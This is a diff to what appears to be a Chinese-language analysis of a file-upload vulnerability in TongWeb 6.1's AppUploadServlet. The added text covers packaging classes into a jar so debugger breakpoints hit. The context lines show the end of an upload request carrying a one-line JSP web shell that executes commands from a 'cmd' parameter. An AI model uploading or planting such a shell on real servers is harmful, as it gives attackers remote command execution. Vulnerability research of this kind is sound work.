@@ -111,3 +111,9 @@ Content-Type: application/octet-stream
 <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
 ------WebKitFormBoundaryaYguOre6zCdYZhE1--
 ```
+
+这个漏洞在远程调试时存在断点无法命中的问题。解决这个问题就需要打jar包。根据class的package全限定名`package com.tongweb.admin.jmx.remote.server.servlet`。将目录切到com的所在目录`TongWeb6.1/applications/sysweb/WEB-INF/classes/`下，利用如下命令进行打包
+```
+jar cvf testsysweb.jar *
+```
+然后将该jar包添加到lib中，这样将断点打到该jar包中的AppUploadServlet类中，即可命中。
